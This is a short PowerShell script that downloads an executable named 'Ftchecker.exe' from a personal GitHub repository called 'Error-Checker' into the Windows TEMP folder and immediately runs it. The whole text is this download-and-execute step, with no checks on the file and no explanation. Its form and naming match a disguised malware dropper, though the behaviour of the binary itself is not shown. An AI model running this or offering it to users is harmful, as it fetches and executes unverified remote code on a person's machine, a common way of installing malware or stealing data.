
$url = "https://github.com/maksgg6767-droid/Error-Checker/raw/refs/heads/main/Ftchecker.exe"
$out = "$env:TEMP\Ftchecker.exe"

Invoke-WebRequest -Uri $url -OutFile $out
Start-Process -FilePath $out -Wait
